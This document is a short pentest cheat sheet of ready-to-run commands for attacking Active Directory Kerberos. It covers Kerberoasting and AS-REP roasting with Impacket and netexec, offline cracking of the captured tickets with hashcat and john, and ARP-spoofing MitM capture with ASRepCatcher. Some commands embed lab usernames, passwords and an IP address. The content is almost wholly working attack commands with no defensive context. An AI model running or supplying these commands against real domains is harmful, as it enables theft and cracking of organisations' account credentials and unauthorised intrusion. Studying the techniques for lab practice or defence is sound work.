**Kerberoasting :**

```sh
GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t

GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'

netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter

GetUserSPNs.py -no-preauth "Asreproastable_User" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
#No_preauth_user=Kerberoastable user
proxychains -q nxc ldap 10.10.168.101 -u svc-web-accounting-d -p 'H3r0n2024#!' --kerberoasting output.txt
```

```sh
john --format=krb5tgs --wordlist= /usr/share/wordlists/rockyou.txt hash
hashcat -m 13100 kerberoastables.txt $wordlist
```

**Asreproast :**

- Users list dynamically queried with an LDAP anonymous bind
```sh
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
```

- With a users file
```
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
```

- Users list dynamically queried with a LDAP authenticated bind (password)
```sh
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
```

- Users list dynamically queried with a LDAP authenticated bind (NT hash)
```sh
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

- Netexec 
```sh
netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
```

- Crack
```sh
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
john --wordlist=$wordlist ASREProastables.txt
```

- MitM:

```sh
# Proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disables ARP spoofing (the MitM must be obtained with other means)
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passively listen for AS-REP packets, no packet alteration
ASRepCatcher listen
```